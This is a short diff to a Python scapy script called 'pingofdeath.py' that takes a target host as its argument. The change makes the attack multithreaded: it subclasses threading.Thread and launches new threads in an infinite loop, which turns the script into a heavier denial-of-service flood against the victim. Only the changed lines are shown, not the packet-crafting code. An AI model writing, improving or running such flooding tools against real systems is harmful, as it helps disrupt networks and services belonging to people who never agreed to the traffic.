@@ -2,7 +2,7 @@
 #author Aiden
 
 from scapy.all import *
-import random  ,re ,sys 
+import random  ,re ,sys ,threading
 
 if len(sys.argv) != 2:
 	print "Usage: pingofdeath.py <target>"
@@ -10,7 +10,7 @@ if len(sys.argv) != 2:
 victim = sys.argv[1]
 sys.tracebacklimit=0
 
-class pingofdeath:
+class pingofdeath(threading.Thread):
 	try:
 		def check(self):
 			global target,victim
@@ -41,7 +41,7 @@ class pingofdeath:
 	except:
 		print 'Victim not available!'
 		sys.exit(1)
-ping = pingofdeath()
+		
 while True:
-	ping.run()
+	pingofdeath().start()
 	
